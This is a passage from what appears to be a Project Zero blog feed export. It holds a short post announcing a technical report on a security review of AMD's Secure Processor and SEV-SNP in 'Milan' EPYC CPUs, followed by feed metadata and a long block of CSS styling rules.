4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"RmvCPDuePa-c4\"&gt;\n &lt;p class=\"RmvCPDuePa-c7\"&gt;&lt;span class=\"RmvCPDuePa-c0\"&gt;Posted by James Forshaw, Google Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"RmvCPDuePa-c3\"&gt;&lt;span class=\"RmvCPDuePa-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"RmvCPDuePa-c7\"&gt;&lt;span&gt;Today&lt;/span&gt;&lt;span&gt;, members of Project Zero and the Google Cloud security team are releasing a &lt;/span&gt;&lt;span class=\"RmvCPDuePa-c6\"&gt;&lt;a class=\"RmvCPDuePa-c11\" href=\"https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/AMD_GPZ-Technical_Report_FINAL_05_2022.pdf\"&gt;technical report&lt;/a&gt;&lt;/span&gt;&lt;span class=\"RmvCPDuePa-c0\"&gt;&amp;nbsp;on a security review of AMD Secure Processor (ASP). The ASP is an isolated ARM processor in AMD EPYC CPUs that adds a root of trust and controls secure system initialization. As it&amp;#39;s a generic processor AMD can add additional security features to the firmware, but like with all complex systems it&amp;#39;s possible these features might have security issues which could compromise the security of everything under the ASP&amp;#39;s management.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"RmvCPDuePa-c3\"&gt;&lt;span class=\"RmvCPDuePa-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"RmvCPDuePa-c7\"&gt;&lt;span&gt;The security review undertaken was on the implementation of the ASP on the 3rd Gen AMD EPYC CPUs (codenamed &amp;quot;Milan&amp;quot;). One feature of the ASP of &lt;/span&gt;&lt;span&gt;interest&lt;/span&gt;&lt;span&gt;&amp;nbsp;to Google is &lt;/span&gt;&lt;span class=\"RmvCPDuePa-c6\"&gt;&lt;a class=\"RmvCPDuePa-c11\" href=\"https://www.amd.com/en/processors/amd-secure-encrypted-virtualization\"&gt;Secure Encrypted Virtualization (SEV)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. SEV adds encryption to the memory used by virtual machines running on the CPU. This feature is of importance to &lt;/span&gt;&lt;span class=\"RmvCPDuePa-c6\"&gt;&lt;a class=\"RmvCPDuePa-c11\" href=\"https://cloud.google.com/confidential-computing\"&gt;Confidential Computing&lt;/a&gt;&lt;/span&gt;&lt;span class=\"RmvCPDuePa-c0\"&gt;&amp;nbsp;as it provides protection of customer cloud data in use, not just at rest or when sending data across a network.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"RmvCPDuePa-c3\"&gt;&lt;span class=\"RmvCPDuePa-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"RmvCPDuePa-c7\"&gt;&lt;span&gt;A particular emphasis of the review was on the Secure Nested Paging (SNP) extension to SEV added to &amp;quot;Milan&amp;quot;. SNP aims to further improve the security of confidential computing by adding integrity protection and mitigations for numerous side-channel attacks. &lt;/span&gt;&lt;span&gt;The review was undertaken with full cooperation with AMD. The team was granted access to source code for the ASP, and production samples to test hardware attacks. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"RmvCPDuePa-c3\"&gt;&lt;span class=\"RmvCPDuePa-c0\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"RmvCPDuePa-c7\"&gt;&lt;span&gt;The review discovered 19 &lt;/span&gt;&lt;span&gt;issues&lt;/span&gt;&lt;span&gt;&amp;nbsp;which have been fixed by AMD in public security bulletins. These issues ranged from incorrect use of cryptography to memory corruption in the context of the ASP firmware. The report describes some of the more interesting issues that were uncovered during the review as well as providing a background on the ASP and the process the team took to find security issues. &lt;/span&gt;&lt;span&gt;You can read more about the review on the &lt;/span&gt;&lt;span class=\"RmvCPDuePa-c6\"&gt;&lt;a class=\"RmvCPDuePa-c11\" href=\"https://cloud.google.com/blog/products/identity-security/google-amd-partner-to-build-a-more-secure-future-with-confidential-computing\"&gt;Google Cloud security blog&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;and the &lt;/span&gt;&lt;span class=\"RmvCPDuePa-c6\"&gt;&lt;a class=\"RmvCPDuePa-c11\" href=\"https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/AMD_GPZ-Technical_Report_FINAL_05_2022.pdf\"&gt;final report&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/6171588576768270104/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/05/release-of-technical-report-into-amd.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/6171588576768270104"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/6171588576768270104"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/05/release-of-technical-report-into-amd.html","@title":"Release of Technical Report into the AMD Security Processor"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-3023870154175197326","published":"2022-04-19T09:06:00.002-07:00","updated":"2022-08-24T12:00:49.125-07:00","title":{"@type":"text","#text":"The More You Know, The More You Know You Don’t Know"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');.lst-kix_qhs0t3wlsx02-8&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-8}ol.lst-kix_h2vtkcla8l9d-2.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-2 0}ul.lst-kix_9i24fh2252ug-1{list-style-type:none}.lst-kix_h2vtkcla8l9d-3&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-3}ul.lst-kix_9i24fh2252ug-0{list-style-type:none}ul.lst-kix_9i24fh2252ug-3{list-style-type:none}ul.lst-kix_9i24fh2252ug-2{list-style-type:none}ul.lst-kix_9i24fh2252ug-5{list-style-type:none}ul.lst-kix_9i24fh2252ug-4{list-style-type:none}ul.lst-kix_9i24fh2252ug-7{list-style-type:none}.lst-kix_czzguda5pqu4-1&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-1}ul.lst-kix_9i24fh2252ug-6{list-style-type:none}.lst-kix_jdourvkzhmg1-7&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-7}ul.lst-kix_9i24fh2252ug-8{list-style-type:none}ul.lst-kix_grz5i5wr9ig-0{list-style-type:none}ul.lst-kix_grz5i5wr9ig-2{list-style-type:none}ul.lst-kix_grz5i5wr9ig-1{list-style-type:none}ul.lst-kix_grz5i5wr9ig-4{list-style-type:none}ul.lst-kix_718o7hzyu4f-1{list-style-type:none}ul.lst-kix_grz5i5wr9ig-3{list-style-type:none}ul.lst-kix_718o7hzyu4f-2{list-style-type:none}ul.lst-kix_grz5i5wr9ig-6{list-style-type:none}ul.lst-kix_grz5i5wr9ig-5{list-style-type:none}ul.lst-kix_718o7hzyu4f-0{list-style-type:none}ul.lst-kix_grz5i5wr9ig-8{list-style-type:none}ul.lst-kix_grz5i5wr9ig-7{list-style-type:none}ol.lst-kix_czzguda5pqu4-8.start{counter-reset:lst-ctn-kix_czzguda5pqu4-8 0}ul.lst-kix_bqyk3pvm93qj-0{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-8{list-style-type:none}ul.lst-kix_718o7hzyu4f-5{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-7{list-style-type:none}ul.lst-kix_718o7hzyu4f-6{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-6{list-style-type:none}ul.lst-kix_718o7hzyu4f-3{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-8.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-8 0}ol.lst-kix_jdourvkzhmg1-4.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-4 0}ul.lst-kix_bqyk3pvm93qj-5{list-style-type:none}ul.lst-kix_718o7hzyu4f-4{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-4{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-3{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-2{list-style-type:none}ul.lst-kix_718o7hzyu4f-7{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-1{list-style-type:none}ul.lst-kix_718o7hzyu4f-8{list-style-type:none}.lst-kix_g56cmc7ljnve-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_g56cmc7ljnve-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_1mxsacho6zj1-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_1mxsacho6zj1-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_9i24fh2252ug-1&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_qhs0t3wlsx02-3.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-3 0}.lst-kix_qhs0t3wlsx02-4&gt;li:before{content:\"\" counter(lst-ctn-kix_qhs0t3wlsx02-4,lower-latin) \". \"}.lst-kix_qhs0t3wlsx02-6&gt;li:before{content:\"\" counter(lst-ctn-kix_qhs0t3wlsx02-6,decimal) \". \"}ol.lst-kix_h2vtkcla8l9d-7.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-7 0}.lst-kix_g56cmc7ljnve-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_g56cmc7ljnve-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_9i24fh2252ug-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_qhs0t3wlsx02-5&gt;li:before{content:\"\" counter(lst-ctn-kix_qhs0t3wlsx02-5,lower-roman) \". \"}.lst-kix_g56cmc7ljnve-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_g56cmc7ljnve-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_g56cmc7ljnve-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_qhs0t3wlsx02-8&gt;li:before{content:\"\" counter(lst-ctn-kix_qhs0t3wlsx02-8,lower-roman) \". \"}.lst-kix_9i24fh2252ug-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_qhs0t3wlsx02-0&gt;li:before{content:\"\" counter(lst-ctn-kix_qhs0t3wlsx02-0,decimal) \". \"}.lst-kix_h2vtkcla8l9d-1&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-1}.lst-kix_qhs0t3wlsx02-7&gt;li:before{content:\"\" counter(lst-ctn-kix_qhs0t3wlsx02-7,lower-latin) \". \"}.lst-kix_g56cmc7ljnve-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_rvy0q9fw47sg-8{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-7{list-style-type:none}.lst-kix_9i24fh2252ug-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_rvy0q9fw47sg-6{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-5{list-style-type:none}.lst-kix_czzguda5pqu4-8&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-8}ul.lst-kix_rvy0q9fw47sg-4{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-3{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-2{list-style-type:none}.lst-kix_qhs0t3wlsx02-4&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-4}ul.lst-kix_bfmkl5o48mun-0{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-1{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-0{list-style-type:none}ul.lst-kix_bfmkl5o48mun-2{list-style-type:none}ul.lst-kix_bfmkl5o48mun-1{list-style-type:none}.lst-kix_h2vtkcla8l9d-7&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-7}.lst-kix_g56cmc7ljnve-6&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_3zaknyhdqv25-0{list-style-type:none}ul.lst-kix_3zaknyhdqv25-2{list-style-type:none}ul.lst-kix_3zaknyhdqv25-1{list-style-type:none}ul.lst-kix_3zaknyhdqv25-4{list-style-type:none}ul.lst-kix_3zaknyhdqv25-3{list-style-type:none}ul.lst-kix_3zaknyhdqv25-6{list-style-type:none}ul.lst-kix_3zaknyhdqv25-5{list-style-type:none}ul.lst-kix_3zaknyhdqv25-8{list-style-type:none}ul.lst-kix_3zaknyhdqv25-7{list-style-type:none}.lst-kix_jdourvkzhmg1-5&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-5}ul.lst-kix_givsp5ka59r-1{list-style-type:none}ul.lst-kix_givsp5ka59r-2{list-style-type:none}ul.lst-kix_givsp5ka59r-3{list-style-type:none}ul.lst-kix_givsp5ka59r-4{list-style-type:none}ul.lst-kix_givsp5ka59r-0{list-style-type:none}.lst-kix_qhs0t3wlsx02-1&gt;li:before{content:\"\" counter(lst-ctn-kix_qhs0t3wlsx02-1,lower-latin) \". \"}.lst-kix_qhs0t3wlsx02-2&gt;li:before{content:\"\" counter(lst-ctn-kix_qhs0t3wlsx02-2,lower-roman) \". \"}.lst-kix_qhs0t3wlsx02-3&gt;li:before{content:\"\" counter(lst-ctn-kix_qhs0t3wlsx02-3,decimal) \". \"}ol.lst-kix_qhs0t3wlsx02-8.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-8 0}.lst-kix_qhs0t3wlsx02-2&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-2}.lst-kix_h2vtkcla8l9d-1&gt;li:before{content:\"\" counter(lst-ctn-kix_h2vtkcla8l9d-1,lower-latin) \". \"}ul.lst-kix_givsp5ka59r-5{list-style-type:none}ul.lst-kix_givsp5ka59r-6{list-style-type:none}.lst-kix_jdourvkzhmg1-8&gt;li:before{content:\"\" counter(lst-ctn-kix_jdourvkzhmg1-8,lower-roman) \". \"}ul.lst-kix_givsp5ka59r-7{list-style-type:none}.lst-kix_rvy0q9fw47sg-4&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_givsp5ka59r-8{list-style-type:none}ol.lst-kix_jdourvkzhmg1-3.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-3 0}.lst-kix_czzguda5pqu4-5&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-5}.lst-kix_h2vtkcla8l9d-3&gt;li:before{content:\"\" counter(lst-ctn-kix_h2vtkcla8l9d-3,decimal) \". \"}.lst-kix_h2vtkcla8l9d-5&gt;li:before{content:\"\" counter(lst-ctn-kix_h2vtkcla8l9d-5,lower-roman) \". \"}.lst-kix_jdourvkzhmg1-2&gt;li:before{content:\"\" counter(lst-ctn-kix_jdourvkzhmg1-2,lower-roman) \". \"}.lst-kix_jdourvkzhmg1-6&gt;li:before{content:\"\" counter(lst-ctn-kix_jdourvkzhmg1-6,decimal) \". \"}.lst-kix_rvy0q9fw47sg-2&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_czzguda5pqu4-7.start{counter-reset:lst-ctn-kix_czzguda5pqu4-7 0}.lst-kix_3zaknyhdqv25-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_jdourvkzhmg1-4&gt;li:before{content:\"\" counter(lst-ctn-kix_jdourvkzhmg1-4,lower-latin) \". \"}.lst-kix_rvy0q9fw47sg-0&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_h2vtkcla8l9d-1.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-1 0}.lst-kix_bqyk3pvm93qj-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_3zaknyhdqv25-3&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_bfmkl5o48mun-4{list-style-type:none}ul.lst-kix_bfmkl5o48mun-3{list-style-type:none}.lst-kix_h2vtkcla8l9d-7&gt;li:before{content:\"\" counter(lst-ctn-kix_h2vtkcla8l9d-7,lower-latin) \". \"}ul.lst-kix_bfmkl5o48mun-6{list-style-type:none}ul.lst-kix_bfmkl5o48mun-5{list-style-type:none}ul.lst-kix_bfmkl5o48mun-8{list-style-type:none}ul.lst-kix_bfmkl5o48mun-7{list-style-type:none}.lst-kix_czzguda5pqu4-7&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-7}.lst-kix_jdourvkzhmg1-0&gt;li:before{content:\"\" counter(lst-ctn-kix_jdourvkzhmg1-0,decimal) \". \"}.lst-kix_3zaknyhdqv25-5&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_knibgsincpme-7{list-style-type:none}.lst-kix_9i24fh2252ug-7&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_knibgsincpme-8{list-style-type:none}.lst-kix_rwsfzn4jdl6v-7&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_qhs0t3wlsx02-0.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-0 0}.lst-kix_rvy0q9fw47sg-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_1mxsacho6zj1-4&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_knibgsincpme-1{list-style-type:none}ul.lst-kix_knibgsincpme-2{list-style-type:none}.lst-kix_9i24fh2252ug-5&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_knibgsincpme-0{list-style-type:none}ul.lst-kix_knibgsincpme-5{list-style-type:none}.lst-kix_1mxsacho6zj1-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_knibgsincpme-6{list-style-type:none}ul.lst-kix_knibgsincpme-3{list-style-type:none}.lst-kix_rvy0q9fw47sg-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_knibgsincpme-4{list-style-type:none}.lst-kix_3zaknyhdqv25-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_givsp5ka59r-4&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_1mxsacho6zj1-4{list-style-type:none}ul.lst-kix_1mxsacho6zj1-5{list-style-type:none}ul.lst-kix_1mxsacho6zj1-2{list-style-type:none}.lst-kix_grz5i5wr9ig-1&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_1mxsacho6zj1-3{list-style-type:none}.lst-kix_jdourvkzhmg1-3&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-3}ul.lst-kix_1mxsacho6zj1-0{list-style-type:none}.lst-kix_1mxsacho6zj1-6&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_1mxsacho6zj1-1{list-style-type:none}.lst-kix_givsp5ka59r-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_1mxsacho6zj1-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_1mxsacho6zj1-8{list-style-type:none}.lst-kix_rwsfzn4jdl6v-5&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_1mxsacho6zj1-6{list-style-type:none}ul.lst-kix_1mxsacho6zj1-7{list-style-type:none}.lst-kix_givsp5ka59r-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_rwsfzn4jdl6v-3&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_jdourvkzhmg1-5.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-5 0}ol.lst-kix_h2vtkcla8l9d-4.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-4 0}.lst-kix_jdourvkzhmg1-4&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-4}ol.lst-kix_jdourvkzhmg1-6.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-6 0}.lst-kix_rwsfzn4jdl6v-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_h2vtkcla8l9d-8&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-8}.lst-kix_qhs0t3wlsx02-3&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-3}.lst-kix_czzguda5pqu4-7&gt;li:before{content:\"\" counter(lst-ctn-kix_czzguda5pqu4-7,lower-latin) \". \"}.lst-kix_czzguda5pqu4-3&gt;li:before{content:\"\" counter(lst-ctn-kix_czzguda5pqu4-3,decimal) \". \"}.lst-kix_czzguda5pqu4-5&gt;li:before{content:\"\" counter(lst-ctn-kix_czzguda5pqu4-5,lower-roman) \". \"}ol.lst-kix_h2vtkcla8l9d-3.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-3 0}.lst-kix_knibgsincpme-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_czzguda5pqu4-1&gt;li:before{content:\"\" counter(lst-ctn-kix_czzguda5pqu4-1,lower-latin) \". \"}.lst-kix_czzguda5pqu4-6&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-6}.lst-kix_h2vtkcla8l9d-2&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-2}.lst-kix_knibgsincpme-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_knibgsincpme-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_knibgsincpme-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_knibgsincpme-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_knibgsincpme-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_jdourvkzhmg1-6&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-6}.lst-kix_czzguda5pqu4-0&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-0}.lst-kix_h2vtkcla8l9d-4&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-4}ol.lst-kix_jdourvkzhmg1-5{list-style-type:none}ol.lst-kix_jdourvkzhmg1-6{list-style-type:none}ol.lst-kix_jdourvkzhmg1-7.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-7 0}ol.lst-kix_jdourvkzhmg1-7{list-style-type:none}ol.lst-kix_jdourvkzhmg1-8{list-style-type:none}.lst-kix_qhs0t3wlsx02-7&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-7}.lst-kix_bfmkl5o48mun-0&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_qhs0t3wlsx02-1.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-1 0}ol.lst-kix_czzguda5pqu4-0.start{counter-reset:lst-ctn-kix_czzguda5pqu4-0 0}.lst-kix_knibgsincpme-8&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_h2vtkcla8l9d-7{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-8{list-style-type:none}.lst-kix_bfmkl5o48mun-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_bfmkl5o48mun-8&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_h2vtkcla8l9d-3{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-4{list-style-type:none}ol.lst-kix_jdourvkzhmg1-1.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-1 0}.lst-kix_bfmkl5o48mun-6&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_h2vtkcla8l9d-5{list-style-type:none}ol.lst-kix_czzguda5pqu4-5.start{counter-reset:lst-ctn-kix_czzguda5pqu4-5 0}ol.lst-kix_h2vtkcla8l9d-6{list-style-type:none}.lst-kix_grz5i5wr9ig-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_bfmkl5o48mun-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_czzguda5pqu4-2&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-2}ol.lst-kix_qhs0t3wlsx02-6.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-6 0}.lst-kix_grz5i5wr9ig-8&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_jdourvkzhmg1-1{list-style-type:none}ol.lst-kix_jdourvkzhmg1-2{list-style-type:none}ol.lst-kix_jdourvkzhmg1-3{list-style-type:none}ol.lst-kix_jdourvkzhmg1-4{list-style-type:none}.lst-kix_grz5i5wr9ig-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_grz5i5wr9ig-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_bfmkl5o48mun-2&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_jdourvkzhmg1-0{list-style-type:none}.lst-kix_grz5i5wr9ig-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_grz5i5wr9ig-6&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_h2vtkcla8l9d-0{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-5.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-5 0}.lst-kix_bfmkl5o48mun-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_bfmkl5o48mun-4&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_h2vtkcla8l9d-1{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-2{list-style-type:none}.lst-kix_bfmkl5o48mun-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_grz5i5wr9ig-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_givsp5ka59r-2&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_h2vtkcla8l9d-0.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-0 0}.lst-kix_givsp5ka59r-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_givsp5ka59r-0&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_g56cmc7ljnve-8{list-style-type:none}ol.lst-kix_jdourvkzhmg1-2.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-2 0}.lst-kix_bqyk3pvm93qj-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_h2vtkcla8l9d-6&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-6}.lst-kix_jdourvkzhmg1-8&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-8}.lst-kix_qhs0t3wlsx02-5&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-5}.lst-kix_bqyk3pvm93qj-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_bqyk3pvm93qj-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_h2vtkcla8l9d-0&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-0}ol.lst-kix_jdourvkzhmg1-8.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-8 0}.lst-kix_bqyk3pvm93qj-5&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_qhs0t3wlsx02-7.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-7 0}.lst-kix_bqyk3pvm93qj-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_bqyk3pvm93qj-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_718o7hzyu4f-5&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_h2vtkcla8l9d-6.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-6 0}.lst-kix_718o7hzyu4f-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_718o7hzyu4f-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_rwsfzn4jdl6v-1{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-2.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-2 0}ul.lst-kix_rwsfzn4jdl6v-2{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-0{list-style-type:none}.lst-kix_718o7hzyu4f-7&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_rwsfzn4jdl6v-5{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-6{list-style-type:none}.lst-kix_718o7hzyu4f-6&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_rwsfzn4jdl6v-3{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-4{list-style-type:none}ul.lst-kix_g56cmc7ljnve-3{list-style-type:none}ol.lst-kix_czzguda5pqu4-6{list-style-type:none}ul.lst-kix_g56cmc7ljnve-2{list-style-type:none}ol.lst-kix_czzguda5pqu4-7{list-style-type:none}ul.lst-kix_g56cmc7ljnve-1{list-style-type:none}ol.lst-kix_czzguda5pqu4-4{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-7{list-style-type:none}ul.lst-kix_g56cmc7ljnve-0{list-style-type:none}ol.lst-kix_czzguda5pqu4-5{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-8{list-style-type:none}ul.lst-kix_g56cmc7ljnve-7{list-style-type:none}.lst-kix_bqyk3pvm93qj-8&gt;li:before{content:\"\\0025a0  \"}ol.lst-kix_czzguda5pqu4-2{list-style-type:none}ul.lst-kix_g56cmc7ljnve-6{list-style-type:none}ol.lst-kix_czzguda5pqu4-3{list-style-type:none}.lst-kix_jdourvkzhmg1-2&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-2}ul.lst-kix_g56cmc7ljnve-5{list-style-type:none}ol.lst-kix_czzguda5pqu4-0{list-style-type:none}.lst-kix_718o7hzyu4f-0&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_g56cmc7ljnve-4{list-style-type:none}ol.lst-kix_czzguda5pqu4-1{list-style-type:none}.lst-kix_718o7hzyu4f-1&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_czzguda5pqu4-6.start{counter-reset:lst-ctn-kix_czzguda5pqu4-6 0}.lst-kix_718o7hzyu4f-3&gt;li:before{content:\"\\0025cf  